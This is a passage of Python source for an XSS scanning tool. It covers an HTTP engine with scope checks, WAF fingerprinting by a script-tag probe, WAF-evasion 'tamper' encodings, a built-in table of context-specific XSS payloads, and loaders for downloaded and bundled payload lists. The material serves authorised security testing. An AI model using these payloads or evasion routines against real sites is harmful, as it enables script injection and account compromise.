class FormField:
    name: str
    value: str = ""
    type: str = "text"
    tag: str = "input"


@dataclass
class InjectionPoint:
    url: str
    method: str
    param: str
    value: str = ""
    # query | form | json | cookie | header | path | fragment | api | websocket
    source: str = "query"
    form_index: Optional[int] = None
    fields: Dict[str, FormField] = field(default_factory=dict)
    page_url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    json_body: Dict[str, Any] = field(default_factory=dict)
    content_type: str = ""
    fragment: str = ""
    path_index: int = -1
    body_text: str = ""
    extra: Dict[str, Any] = field(default_factory=dict)

    def key(self) -> str:
        return "|".join(
            [self.source, self.method, self.url, self.param, str(self.form_index), str(self.path_index)]
        )


@dataclass
class ReflectionInfo:
    reflected: bool = False
    context: str = "unknown"
    executable: bool = False
    raw_specials: List[str] = field(default_factory=list)
    snippet: str = ""
    detail: str = ""
    efficiency: float = 0.0
    distortion: float = 0.0


@dataclass
class WAFReport:
    names: List[str] = field(default_factory=list)
    blocking: bool = False

    def __bool__(self) -> bool:
        return bool(self.names)

    def label(self) -> str:
        return ", ".join(self.names) if self.names else "none detected"


@dataclass
class HttpResponse:
    url: str
    status: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    text: str = ""
    elapsed: float = 0.0
    error: Optional[str] = None
    from_cache: bool = False
    truncated: bool = False

    @property
    def ok(self) -> bool:
        return self.error is None and 200 <= self.status < 400

    def header(self, name: str, default: str = "") -> str:
        return self.headers.get(name.lower(), default)


# --------------------------------------------------------------------------------------
# Persistent state
# --------------------------------------------------------------------------------------


class StateStore:
    """Crash-safe JSON checkpoints for a target (resume + finding dedupe)."""

    SCHEMA = 1

    def __init__(self, target: str, directory: str, enabled: bool = True, console: Optional[Any] = None):
        self.target = target
        self.enabled = enabled
        self.console = console
        digest = hashlib.sha256(target.encode("utf-8", "replace")).hexdigest()[:12]
        host = urlsplit(target).hostname or "target"
        base = Path(directory)
        self.path = base / "state" / f"{slugify(host)}-{digest}.json"
        self.created = now_iso()
        self.scanned: Set[str] = set()
        self.findings: List[Dict[str, Any]] = []
        self.waf: List[str] = []
        self.extra: Dict[str, Any] = {}
        self._lock = threading.RLock()
        self._last_save = 0.0
        # Periodic per-URL saves hit the disk hundreds of times on big scans;
        # debounced saves keep resume safety without the write storm.
        self.min_save_interval = 1.0

    def load(self) -> bool:
        if not self.enabled or not self.path.exists():
            return False
        try:
            data = json.loads(self.path.read_text(encoding="utf-8"))
        except Exception:
            if self.console:
                self.console.warn(f"Ignoring unreadable checkpoint: {self.path}")
            return False
        if not isinstance(data, dict) or data.get("target") != self.target:
            if self.console:
                self.console.warn(f"Ignoring checkpoint with a different or invalid target: {self.path}")
            return False
        if data.get("schema") != self.SCHEMA:
            if self.console:
                self.console.warn(
                    f"Ignoring checkpoint schema {data.get('schema')!r}; expected {self.SCHEMA}: {self.path}"
                )
            return False
        if not all(
            isinstance(data.get(key, default), expected)
            for key, default, expected in (
                ("scanned", [], list), ("findings", [], list),
                ("waf", [], list), ("extra", {}, dict),
            )
        ):
            if self.console:
                self.console.warn(f"Ignoring incompatible checkpoint schema or data: {self.path}")
            return False
        if not all(isinstance(item, str) for item in data.get("scanned", [])) or not all(
            isinstance(item, dict) for item in data.get("findings", [])
        ) or not all(isinstance(item, str) for item in data.get("waf", [])):
            if self.console:
                self.console.warn(f"Ignoring checkpoint with invalid entries: {self.path}")
            return False
        self.created = data.get("created", self.created)
        self.scanned = set(data.get("scanned", []))
        self.findings = list(data.get("findings", []))
        self.waf = list(data.get("waf", []))
        self.extra = dict(data.get("extra", {}))
        return True

    def save(self, force: bool = False) -> None:
        if not self.enabled:
            return
        now = time.monotonic()
        if not force and (now - self._last_save) < self.min_save_interval:
            # Debounced: a periodic save is skipped, but a forced one (finding
            # added, scan finished/cancelled) always goes through so crash
            # resume never loses findings.
            return
        self._last_save = now
        payload = {
            "schema": self.SCHEMA,
            "tool": f"{APP_NAME} {VERSION}",
            "target": self.target,
            "created": self.created,
            "updated": now_iso(),
            "scanned": sorted(self.scanned),
            "findings": self.findings,
            "waf": self.waf,
            "extra": self.extra,
        }
        with self._lock:
            try:
                self.path.parent.mkdir(parents=True, exist_ok=True)
                tmp = self.path.with_suffix(".json.tmp")
                tmp.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
                os.replace(tmp, self.path)
            except OSError:
                pass

    def is_scanned(self, url: str) -> bool:
        return normalize_url(url) in self.scanned

    def mark_scanned(self, url: str) -> None:
        with self._lock:
            self.scanned.add(normalize_url(url))

    def add_finding(self, finding: Finding) -> None:
        with self._lock:
            self.findings.append(finding.to_dict())

    def reset(self) -> None:
        self.scanned.clear()
        self.findings.clear()
        self.waf.clear()
        self.extra.clear()
        try:
            if self.path.exists():
                self.path.unlink()
        except OSError:
            pass


# --------------------------------------------------------------------------------------
# Rate limiting
# --------------------------------------------------------------------------------------


class RateLimiter:
    def __init__(self, rate_per_second: float = 0.0):
        self.interval = (1.0 / rate_per_second) if rate_per_second and rate_per_second > 0 else 0.0
        self._lock = asyncio.Lock()
        self._next_at = 0.0

    async def acquire(self) -> None:
        if self.interval <= 0:
            return
        async with self._lock:
            now = time.monotonic()
            wait = max(0.0, self._next_at - now)
            self._next_at = max(now, self._next_at) + self.interval
        if wait:
            await asyncio.sleep(wait)


# --------------------------------------------------------------------------------------
# HTTP engine
# --------------------------------------------------------------------------------------


class HttpEngine:
    """aiohttp wrapper with retries, backoff, rate limiting and a small TTL cache."""

    RETRY_STATUS = {429, 500, 502, 503, 504}

    def __init__(
        self,
        console: Console,
        stats: ScanStats,
        *,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        timeout: float = 20.0,
        retries: int = 2,
        rate: float = 0.0,
        concurrency: int = 16,
        proxy: Optional[str] = None,
        insecure: bool = False,
        cache_ttl: float = 60.0,
        cache_size: int = 512,
        max_response_bytes: int = 5 * 1024 * 1024,
        redirect_scope: Optional[Any] = None,
    ):
        self.console = console
        self.stats = stats
        self.base_headers = dict(headers or {})
        self.base_headers.setdefault("User-Agent", USER_AGENT)
        self.base_headers.setdefault("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
        self.base_headers.setdefault("Accept-Language", "en-US,en;q=0.9")
        self.cookies = dict(cookies or {})
        self.timeout = timeout
        self.retries = max(0, retries)
        self.proxy = proxy
        self.insecure = insecure
        self.cache_ttl = cache_ttl
        self.cache_size = cache_size
        self.max_response_bytes = max(1024, int(max_response_bytes))
        self.redirect_scope = redirect_scope
        self.rate = rate
        self.limiter = RateLimiter(rate)
        self.semaphore = asyncio.Semaphore(max(1, concurrency))
        self.session: Optional[ClientSession] = None
        self._cache: Dict[str, Tuple[float, HttpResponse]] = {}
        self._host_failures: Counter = Counter()
        self._smart_limiter = None
        self._use_smart_rate = False

    async def start(self) -> None:
        if self.session is not None and not self.session.closed:
            return
        assert aiohttp is not None, "aiohttp is not installed"
        resolver = aiohttp.ThreadedResolver()
        # The c-ares resolver is fast on Unix event loops. Windows defaults to
        # ProactorEventLoop, which is not compatible with aiodns 3.x callbacks.
        if sys.platform != "win32":
            try:
                resolver = aiohttp.AsyncResolver()
            except Exception:
                pass
        connector = aiohttp.TCPConnector(
            resolver=resolver,
            limit=100,
            ttl_dns_cache=300,
            ssl=not self.insecure,
            enable_cleanup_closed=True,
        )
        timeout = aiohttp.ClientTimeout(total=self.timeout, connect=min(self.timeout, 10.0))
        self.session = aiohttp.ClientSession(
            headers=self.base_headers,
            cookies=self.cookies,
            timeout=timeout,
            connector=connector,
        )

    async def close(self) -> None:
        if self.session is not None and not self.session.closed:
            await self.session.close()
        self.session = None
    
    def enable_smart_rate(self, initial_rate: float) -> None:
        """Enable adaptive smart rate limiting."""
        if not HAS_ADVANCED:
            return
        from xoxss.analysis.rate_limit import SmartRateLimiter
        self._smart_limiter = SmartRateLimiter(initial_rate)
        self._use_smart_rate = True
    
    async def _apply_rate_limit(self, host: str) -> None:
        """Apply rate limiting (smart or standard)."""
        if self._use_smart_rate and self._smart_limiter:
            await self._smart_limiter.acquire()
        else:
            await self.limiter.acquire()

    # -- public API -------------------------------------------------------------------
    async def get(
        self,
        url: str,
        *,
        headers: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
        cache: bool = False,
    ) -> HttpResponse:
        return await self.request("GET", url, headers=headers, allow_redirects=allow_redirects, cache=cache)

    async def post(
        self,
        url: str,
        *,
        data: Optional[Dict[str, str]] = None,
        json_body: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
    ) -> HttpResponse:
        return await self.request(
            "POST",
            url,
            data=data,
            json_body=json_body,
            headers=headers,
            allow_redirects=allow_redirects,
        )

    async def request(
        self,
        method: str,
        url: str,
        *,
        headers: Optional[Dict[str, str]] = None,
        data: Optional[Dict[str, str]] = None,
        json_body: Optional[Dict[str, Any]] = None,
        allow_redirects: bool = True,
        cache: bool = False,
    ) -> HttpResponse:
        if self.redirect_scope is not None and not self.redirect_scope(url):
            self.stats.errors += 1
            return HttpResponse(url=url, error="request target is outside the configured scan scope")
        if self.session is None:
            await self.start()

        cache_key = self._cache_key(method, url, headers, data, json_body)
        if cache and cache_key in self._cache:
            expiry, cached = self._cache[cache_key]
            if expiry > time.monotonic():
                hit = HttpResponse(**{**cached.__dict__, "from_cache": True})
                return hit

        delay = 0.0
        last_error = "request failed after retries"
        for attempt in range(self.retries + 1):
            if delay:
                await asyncio.sleep(delay)
            try:
                async with self.semaphore:
                    assert self.session is not None
                    current_url, current_method = url, method
                    current_data, current_json = data, json_body
                    for redirect_count in range(11):
                        await self._apply_rate_limit(urlsplit(current_url).hostname or "")
                        if redirect_count == 0:
                            started = time.monotonic()
                        response = await self.session.request(
                            current_method,
                            current_url,
                            headers=headers,
                            data=current_data,
                            json=current_json,
                            allow_redirects=False,
                            proxy=self.proxy,
                            ssl=not self.insecure,
                        )
                        self.stats.requests += 1
                        location = response.headers.get("Location")
                        is_redirect = response.status in (301, 302, 303, 307, 308) and location
                        if not (allow_redirects and is_redirect):
                            break
                        next_url = urljoin(str(response.url), location)
                        current_parts = urlsplit(str(response.url))
                        next_parts = urlsplit(next_url)
                        same_origin = (
                            current_parts.scheme.lower(), current_parts.hostname, current_parts.port
                        ) == (
                            next_parts.scheme.lower(), next_parts.hostname, next_parts.port
                        )
                        if not same_origin or (
                            self.redirect_scope is not None and not self.redirect_scope(next_url)
                        ):
                            result = HttpResponse(
                                url=str(response.url), status=response.status,
                                headers={k.lower(): v for k, v in response.headers.items()},
                                error="redirect target is outside the request origin or scan scope",
                            )
                            response.release()
                            return result
                        response.release()
                        if redirect_count == 10:
                            return HttpResponse(url=current_url, error="too many redirects")
                        if response.status == 303 or (response.status in (301, 302) and current_method.upper() == "POST"):
                            current_method, current_data, current_json = "GET", None, None
                        current_url = next_url
                    try:
                        raw = bytearray()
                        while len(raw) <= self.max_response_bytes:
                            chunk = await response.content.read(min(65536, self.max_response_bytes + 1 - len(raw)))
                            if not chunk:
                                break
                            raw.extend(chunk)
                        truncated = len(raw) > self.max_response_bytes
                        if truncated:
                            del raw[self.max_response_bytes:]
                        try:
                            text = bytes(raw).decode(response.get_encoding() or "utf-8", "replace")
                        except (LookupError, RuntimeError):
                            text = bytes(raw).decode("utf-8", "replace")
                        elapsed = time.monotonic() - started
                        result = HttpResponse(
                            url=str(response.url),
                            status=response.status,
                            headers={k.lower(): v for k, v in response.headers.items()},
                            text=text,
                            elapsed=elapsed,
                            truncated=truncated,
                        )
                        if truncated:
                            self.stats.truncated_responses += 1
                            self.console.debug(
                                f"Response from {truncate(str(response.url), 120)} exceeded "
                                f"{self.max_response_bytes} bytes; analysis used a truncated body"
                            )
                        # Track for smart rate limiter
                        if self._use_smart_rate and self._smart_limiter:
                            self._smart_limiter.record_request(
                                success=response.status < 400,
                                elapsed=elapsed,
                                is_retry=False
                            )
                        
                        if response.status in self.RETRY_STATUS and attempt < self.retries:
                            delay = self._retry_delay(response, attempt)
                            self.stats.blocked += 1
                            self.console.debug(
                                f"{method} {truncate(url, 120)} -> HTTP {response.status}, retrying in {delay:.1f}s"
                            )
                            continue
                        self.console.debug(
                            f"{method} {truncate(url, 120)} -> {response.status} ({elapsed * 1000:.0f} ms)"
                        )
                        if cache:
                            self._store_cache(cache_key, result)
                        return result
                    finally:
                        response.release()
            except asyncio.CancelledError:
                raise
            except asyncio.TimeoutError:
                delay = min(8.0, 0.6 * (2 ** attempt))
                self.console.debug(f"{method} {truncate(url, 120)} -> timeout, retry {attempt + 1}/{self.retries}")
                if self._use_smart_rate and self._smart_limiter:
                    self._smart_limiter.record_request(success=False, elapsed=delay, is_retry=True)
            except socket.gaierror as exc:
                host = urlsplit(url).hostname or "unknown host"
                last_error = f"DNS resolution failed for {host}: {exc}"
                if exc.errno != socket.EAI_AGAIN:
                    self.console.debug(last_error)
                    break
                delay = min(8.0, 0.6 * (2 ** attempt))
                self.console.debug(
                    f"{last_error}; retry {attempt + 1}/{self.retries} in {delay:.1f}s"
                )
                if host != "unknown host":
                    self._host_failures[host] += 1
            except Exception as exc:  # aiohttp errors, DNS, TLS, connection resets
                dns_exc = exc if isinstance(exc, socket.gaierror) else getattr(exc, "os_error", None)
                if isinstance(dns_exc, socket.gaierror):
                    host = urlsplit(url).hostname or "unknown host"
                    last_error = f"DNS resolution failed for {host}: {dns_exc}"
                    if dns_exc.errno != socket.EAI_AGAIN:
                        self.console.debug(last_error)
                        break
                    delay = min(8.0, 0.6 * (2 ** attempt))
                    self.console.debug(
                        f"{last_error}; retry {attempt + 1}/{self.retries} in {delay:.1f}s"
                    )
                    if host != "unknown host":
                        self._host_failures[host] += 1
                    continue
                delay = min(8.0, 0.6 * (2 ** attempt))
                last_error = f"{type(exc).__name__}: {exc}"
                self.console.debug(f"{method} {truncate(url, 120)} -> {last_error}")
                host = urlsplit(url).hostname or ""
                if host:
                    self._host_failures[host] += 1
                if self._use_smart_rate and self._smart_limiter:
                    self._smart_limiter.record_request(success=False, elapsed=delay, is_retry=True)

        self.stats.errors += 1
        return HttpResponse(url=url, error=last_error)

    # -- internals --------------------------------------------------------------------
    @staticmethod
    def _cache_key(
        method: str,
        url: str,
        headers: Optional[Dict[str, str]],
        data: Optional[Dict[str, str]],
        json_body: Optional[Dict[str, Any]] = None,
    ) -> str:
        raw = json.dumps(
            [method.upper(), url, headers or {}, data or {}, json_body or {}],
            sort_keys=True,
            default=str,
        )
        return hashlib.sha1(raw.encode("utf-8", "replace")).hexdigest()

    def _store_cache(self, key: str, response: HttpResponse) -> None:
        if len(self._cache) >= self.cache_size:
            # drop the oldest entry (dicts keep insertion order)
            self._cache.pop(next(iter(self._cache)), None)
        self._cache[key] = (time.monotonic() + self.cache_ttl, response)

    def peek(self, url: str) -> Optional[HttpResponse]:
        """Cached GET response for ``url`` without any network activity."""
        cache_key = self._cache_key("GET", url, None, None, None)
        entry = self._cache.get(cache_key)
        if entry is None:
            return None
        expiry, cached = entry
        if expiry <= time.monotonic():
            return None
        return HttpResponse(**{**cached.__dict__, "from_cache": True})

    @staticmethod
    def _retry_delay(response: ClientResponse, attempt: int) -> float:
        retry_after = response.headers.get("Retry-After", "")
        if retry_after.isdigit():
            return min(30.0, float(retry_after))
        return min(8.0, 0.7 * (2 ** attempt)) + random.uniform(0, 0.4)


# --------------------------------------------------------------------------------------
# WAF fingerprinting
# --------------------------------------------------------------------------------------


class WAFDetector:
    HEADER_SIGNATURES = HEADER_SIGNATURES
    BODY_SIGNATURES = BODY_SIGNATURES
    BLOCK_WORDS = BLOCK_WORDS

    def __init__(self, engine: HttpEngine, console: Console, target: str):
        self.engine = engine
        self.console = console
        self.target = target

    async def detect(self) -> WAFReport:
        report = WAFReport()
        response = await self.engine.get(self.target, cache=False)
        if response.error:
            return report

        if fingerprint_waf is not None:
            report.names = fingerprint_waf(
                response.headers, response.text, response.header("set-cookie", "")
            )

        probe_url = merge_query(self.target, {"xoxss_waf_probe": "<script>alert(1)</script>"})
        probe = await self.engine.get(probe_url, allow_redirects=False)
        if probe.error is None and looks_blocked is not None:
            if looks_blocked(probe.status, probe.text, self.BLOCK_WORDS):
                report.blocking = True
                if not report.names:
                    report.names.append("Generic/Unknown WAF")

        report.names = sorted(set(report.names))
        if report.names:
            message = f"WAF detected: {', '.join(report.names)}"
            if report.blocking:
                message += " (payload probe was blocked - consider --tamper)"
            self.console.warn(message)
        else:
            self.console.info("No WAF fingerprint matched")
        return report

# --------------------------------------------------------------------------------------
# Tamper techniques
# --------------------------------------------------------------------------------------


def _random_case(value: str) -> str:
    return "".join(ch.upper() if random.random() < 0.5 else ch.lower() for ch in value)


def tamper_uppercase(payload: str) -> str:
    """Randomise only case-insensitive parts (tag names, event names, scheme)."""
    payload = re.sub(r"<([a-zA-Z][a-zA-Z0-9]*)", lambda m: "<" + _random_case(m.group(1)), payload)
    payload = re.sub(r"\b(on[a-zA-Z]+)(\s*=)", lambda m: _random_case(m.group(1)) + m.group(2), payload)
    payload = re.sub(r"\b(javascript|data)\s*:", lambda m: _random_case(m.group(1)) + ":", payload, flags=re.I)
    return payload


def tamper_doubleencode(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def tamper_hexencode(payload: str) -> str:
    return "".join(f"%{ord(ch):02X}" for ch in payload)


def tamper_urlencode(payload: str) -> str:
    return quote(payload, safe="")


def tamper_jsonfuzz(payload: str) -> str:
    encoded = json.dumps(payload)[1:-1]
    return encoded.replace("<", "\\u003c").replace(">", "\\u003e").replace("&", "\\u0026")


def tamper_htmlentities(payload: str) -> str:
    return (
        payload.replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
        .replace("'", "&#x27;")
    )


def tamper_spacetab(payload: str) -> str:
    return payload.replace(" ", "\t")


def tamper_jscomment(payload: str) -> str:
    return payload.replace(";", ";/**/").replace(" ", "/**/")


TAMPERS = {
    "doubleencode": tamper_doubleencode,
    "uppercase": tamper_uppercase,
    "hexencode": tamper_hexencode,
    "urlencode": tamper_urlencode,
    "jsonfuzz": tamper_jsonfuzz,
    "htmlentities": tamper_htmlentities,
    "spacetab": tamper_spacetab,
    "jscomment": tamper_jscomment,
}

# "all" is deliberately limited to transforms that keep the payload semantically valid.
TAMPER_CHAINS = {
    "all": ["spacetab", "uppercase"],
}


def apply_tamper(payload: str, name: Optional[str]) -> str:
    if not name:
        return payload
    if name in TAMPER_CHAINS:
        result = payload
        for step in TAMPER_CHAINS[name]:
            result = TAMPERS[step](result)
        return result
    func = TAMPERS.get(name)
    return func(payload) if func else payload


# --------------------------------------------------------------------------------------
# Payload engine
# --------------------------------------------------------------------------------------

DEFAULT_PAYLOADS: Dict[str, List[str]] = {
    "html": [
        "<script>{m}</script>",
        "<img src=x onerror=\"{m}\">",
        "<svg onload=\"{m}\">",
        "<details open ontoggle=\"{m}\">",
        "<input autofocus onfocus=\"{m}\">",
        "<body onload=\"{m}\">",
        "<iframe srcdoc=\"<script>{m}</script>\">",
        "<video><source onerror=\"{m}\"></video>",
        "<math><mtext><table><mglyph><style><img src=x onerror=\"{m}\">",
    ],
    "attr_double": [
        "\" onmouseover=\"{m}\" x=\"",
        "\" autofocus onfocus=\"{m}\" x=\"",
        "\"><script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "\" onpointerover=\"{m}\" x=\"",
    ],
    "attr_single": [
        "' onmouseover='{m}' x='",
        "' autofocus onfocus='{m}' x='",
        "'><script>{m}</script>",
        "'><img src=x onerror='{m}'>",
    ],
    "attr_unquoted": [
        " onmouseover={m} x=",
        " autofocus onfocus={m} x=",
        "><script>{m}</script>",
    ],
    "script": [
        "';{m};//",
        "\";{m};//",
        "</script><script>{m}</script>",
        "`;{m};//",
        "*/{m}/*",
        "\\';{m};//",
    ],
    "style": [
        "</style><script>{m}</script>",
        "</style><img src=x onerror=\"{m}\">",
    ],
    "comment": [
        "--><script>{m}</script><!--",
        "--!><script>{m}</script><!--",
        "--><img src=x onerror=\"{m}\"><!--",
    ],
    "json": [
        "\\u003cscript\\u003e{m}\\u003c/script\\u003e",
        "\\u003cimg src=x onerror={m}\\u003e",
        "</script><script>{m}</script>",
    ],
    "url": [
        "javascript:{m}",
        "javascript:/*{m}*/",
    ],
    "generic": [
        "<script>{m}</script>",
        "\"><img src=x onerror=\"{m}\">",
        "'><svg onload='{m}'>",
        "<img src=x onerror=\"{m}\">",
    ],
}


def _plausible_remote_payload(line: str) -> bool:
    """Filter noise out of the downloaded lists (headings, prose, URLs, ...)."""
    if not line or len(line) > 2048:
        return False
    if line.startswith(("#", "//", "<!--", "/*", "*", "|", "-", ">")):
        return False
    lowered = line.lower()
    stripped = lowered.strip()
    if stripped in {"<html>", "</html>", "<body>", "</body>", "<head>", "</head>", "<!doctype html>"}:
        return False
    if lowered.startswith(("http://", "https://")) and "<" not in line:
        return False
    if "<" in line:
        return True
    if "javascript:" in lowered:
        return True
    if re.search(r"\bon[a-z]{3,}\s*=", lowered):
        return True
    if re.search(r"\b(?:alert|prompt|confirm)\s*\(", lowered):
        return True
    return False


def classify_remote_payload(payload: str) -> str:
    lowered = payload.lower()
    stripped = payload.lstrip()
    if "javascript:" in lowered:
        return "url"
    if "</script" in lowered or lowered.startswith(("';", "\";", "`;")):
        return "script"
    if stripped.startswith('"'):
        return "attr_double"
    if stripped.startswith("'"):
        return "attr_single"
    if "<script" in lowered or "srcdoc" in lowered:
        return "html"
    return "generic"


def embed_marker(payload: str, marker: str, context: str = "") -> str:
    """Insert the quote-free execution marker into an arbitrary payload."""
    if re.search(r"<script[^>]*\bsrc\s*=", payload, re.I):
        return f"{payload}<script>{marker}</script>"
    if re.search(r"</script\s*>", payload, re.I):
        return re.sub(r"</script\s*>", lambda match: f";{marker}" + match.group(0), payload, count=1, flags=re.I)
    if context in ("script", "url"):
        return f"{payload};{marker}"
    quoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([\"'])(.*?)\2", payload, re.S | re.I)
    if quoted:
        return (
            payload[: quoted.start(3)]
            + quoted.group(3)
            + ";"
            + marker
            + payload[quoted.end(3):]
        )
    unquoted = re.search(r"(on[a-zA-Z]+\s*=\s*)([^\s>]+)", payload, re.I)
    if unquoted:
        return payload[: unquoted.end(2)] + ";" + marker + payload[unquoted.end(2):]
    if payload.lstrip().lower().startswith("javascript:"):
        return f"{payload};{marker}"
    return f"{payload}<script>{marker}</script>"


def payload_workdir(base_dir: Optional[str] = None) -> Path:
    """Temp directory for this run's payloads (``/tmp`` on POSIX, ``%TEMP%`` on Windows)."""
    root = Path(base_dir) if base_dir else Path(os.environ.get("XOXSS_TMPDIR") or tempfile.gettempdir())
    return root / f"xoxss-payloads-{os.getpid()}-{uuid.uuid4().hex[:8]}"


def download_payload_lists(
    console: Console,
    sources: Sequence[str],
    limit: int,
    base_dir: Optional[str] = None,
    work_dir: Optional[Path] = None,
) -> Tuple[List[Path], Optional[Path]]:
    """Download public XSS payload lists into a throw-away temp directory.

    Returns ``(files, workdir)``. ``workdir`` must be passed to
    :func:`cleanup_payload_lists` when the scan is over.
    """
    if limit <= 0 or limit > MAX_REMOTE_PAYLOADS:
        limit = MAX_REMOTE_PAYLOADS
    work = work_dir or payload_workdir(base_dir)
    try:
        work.mkdir(parents=True, exist_ok=True)
    except OSError as exc:
        console.warn(f"Cannot create temporary payload directory {work}: {exc}")
        return [], None

    console.info(f"Downloading XSS payload lists ({len(sources)} source(s)) -> {work}")
    batches: List[List[str]] = []
    seen: Set[str] = set()
    for url in sources:
        try:
            request = urllib.request.Request(
                url,
                headers={"User-Agent": USER_AGENT, "Accept": "text/plain,*/*"},
            )
            with urllib.request.urlopen(request, timeout=25) as response:
                raw = response.read(MAX_PAYLOAD_BYTES + 1)
            if len(raw) > MAX_PAYLOAD_BYTES:
                raw = raw[:MAX_PAYLOAD_BYTES]
            text = raw.decode("utf-8", "replace")
        except Exception as exc:
            console.warn(f"Payload source failed ({type(exc).__name__}: {exc}): {truncate(url, 110)}")
            continue

        batch: List[str] = []
        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not _plausible_remote_payload(line) or line in seen:
                continue
            seen.add(line)
            batch.append(line)
            if len(batch) >= limit:
                break
        if batch:
            batches.append(batch)
            console.debug(f"{truncate(url, 100)} -> {len(batch)} candidate payload(s)")
        else:
            console.debug(f"No usable payloads found in {truncate(url, 110)}")

    if not batches:
        shutil.rmtree(work, ignore_errors=True)
        console.warn("Remote payload download failed; using built-in payloads")
        return [], None

    # Round-robin across sources so every list contributes even with a small limit.
    chosen: List[str] = []
    cursor = 0
    while len(chosen) < limit:
        progressed = False
        for batch in batches:
            if cursor < len(batch) and len(chosen) < limit:
                chosen.append(batch[cursor])
                progressed = True
        if not progressed:
            break
        cursor += 1

    path = work / "payloads.txt"
    try:
        path.write_text("\n".join(chosen) + "\n", encoding="utf-8")
    except OSError as exc:
        console.warn(f"Cannot write payload cache {path}: {exc}")
        shutil.rmtree(work, ignore_errors=True)
        return [], None

    console.ok(f"Loaded {len(chosen)} remote XSS payload(s) into temporary storage", important=False)
    return [path], work


def cleanup_payload_lists(work: Optional[Path], keep: bool, console: Console) -> None:
    if work is None:
        return
    if keep:
        console.info(f"Keeping temporary payloads at {work} (--keep-payloads)")
        return
    shutil.rmtree(work, ignore_errors=True)
    console.debug(f"Removed temporary payload directory {work}")


LAZY_PAYLOAD_FILE = Path(__file__).resolve().parent / "data" / "lazyxss.txt"


class PayloadEngine:
    CONTEXTS = tuple(DEFAULT_PAYLOADS.keys())

    def __init__(
        self,
        console: Console,
        extra_file: Optional[str] = None,
        remote_files: Optional[Sequence[str]] = None,
        corpus_dirs: Optional[Sequence[str]] = None,
        lazy_payloads: bool = True,
    ):
        self.console = console
        self.payloads: Dict[str, List[str]] = {key: list(value) for key, value in DEFAULT_PAYLOADS.items()}
        self.remote_payloads: List[str] = []
        self.lazy_payloads: List[str] = []
        self._lazy_by_context: Dict[str, List[str]] = {}
        self._lazy_pool_cache: Dict[str, List[str]] = {}
        self._remote_set: Set[str] = set()
        self._seen: Set[str] = {payload for values in self.payloads.values() for payload in values}
        # A payload may deliberately live in more than one context (classified
        # context + generic fallback), so de-duplicate per slot, not per string.
        self._seen_slots: Set[Tuple[str, str]] = {
            (context, payload)
            for context, values in self.payloads.items()
            for payload in values
        }
        if extra_file:
            for path in str(extra_file).split(os.pathsep):
                if path.strip():
                    self._load_file(path.strip())
        for directory in corpus_dirs or []:
            self._load_dir(directory)
        for path in remote_files or []:
            self._load_file(str(path), remote=True, quiet=True)
        if lazy_payloads:
            self._load_lazy_corpus()

    def _load_lazy_corpus(self, limit: int = 12000) -> None:
        """Load the bundled LazyXss corpus as an extended, context-classified pool.

        The corpus is kept separate from ``payloads`` so the hand-curated
        context payloads still receive most slots.  ``payloads_for`` reserves a
        share of each batch for this pool, which keeps 7k payloads from pushing
        the reliable built-ins out of the way.
        """
        path = LAZY_PAYLOAD_FILE
        if not path.is_file():
            self.console.debug(f"Bundled payload pack not found: {path}")
            return
        added = 0
        seen: Set[str] = set()
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                for raw in handle:
                    payload = raw.strip()
                    if not payload or len(payload) > 2048:
                        continue
                    if payload in seen or payload in self._seen:
                        continue
                    # Reject prose/headings while keeping fragment and comment
                    # payloads (e.g. ``#<script>``) that are valid for DOM sinks.
                    lowered = payload.lower()
                    if not any(
                        marker in lowered
                        for marker in (
                            "<", "javascript:", "onerror", "onload", "onfocus",
                            "alert", "prompt", "confirm", "eval(", "settimeout(",
                            "%3c", "&lt;", "&lpar;", "&#", "svg", "script",
                            "iframe", "srcdoc", "formaction", "document.",
                            "window[", "top[", "constructor", "\\x", "\\u",
                        )
                    ):
                        continue
                    seen.add(payload)
                    self.lazy_payloads.append(payload)
                    context = classify_remote_payload(payload)
                    self._lazy_by_context.setdefault(context, []).append(payload)
                    if context != "generic":
                        self._lazy_by_context.setdefault("generic", []).append(payload)
                    added += 1
                    if added >= limit:
                        break
        except OSError as exc:
            self.console.warn(f"Could not read bundled payload pack {path}: {exc}")
            return
        if added:
            self.console.ok(
                f"Bundled LazyXss payload pack: {added} payload(s) ({path.name})",
                important=False,
            )

    def _load_dir(self, directory: str) -> None:
        root = Path(directory).expanduser()
        if not root.is_dir():
            self.console.warn(f"Payload directory not found: {directory}")
            return
        files = sorted(
            path
            for path in root.rglob("*")
            if path.is_file() and path.suffix.lower() in (".txt", ".lst", ".json")
        )
        if not files:
            self.console.warn(f"No .txt/.lst/.json payload files under {directory}")
            return
        for path in files:
            self._load_file(str(path))
        self.console.ok(f"Payload corpus: {len(files)} file(s) under {directory}", important=False)

    def _load_json(self, path: str, quiet: bool = False) -> int:
        added = 0
        try:
            with open(path, "r", encoding="utf-8-sig", errors="replace") as handle:
                data = json.load(handle)
        except (OSError, ValueError) as exc:
            self.console.warn(f"Could not read payload JSON {path}: {exc}")
            return 0
        items = data.get("payloads") if isinstance(data, dict) else data
        if not isinstance(items, list):
            self.console.warn(f"Payload JSON {path} is not a list: expected [\"payload\", ...]")
            return 0
        for item in items:
            if isinstance(item, str):
                payload, context = item.strip(), "generic"
                if "|" in payload:
                    prefix, rest = payload.split("|", 1)
                    if prefix.strip().lower() in self.payloads:
                        context, payload = prefix.strip().lower(), rest.strip()
            elif isinstance(item, dict):
                payload = str(item.get("payload") or "").strip()
                context = str(item.get("context") or "generic").lower()
            else:
                continue
            if not payload or payload.startswith("#"):
                continue
            if context not in self.payloads:
                context = "generic"
            if self._register(context, payload):
                added += 1
        if not quiet and added:
            self.console.ok(f"Loaded {added} payload(s) from {path}", important=False)
        return added

    def _register(self, context: str, payload: str) -> bool:
        slot = (context, payload)
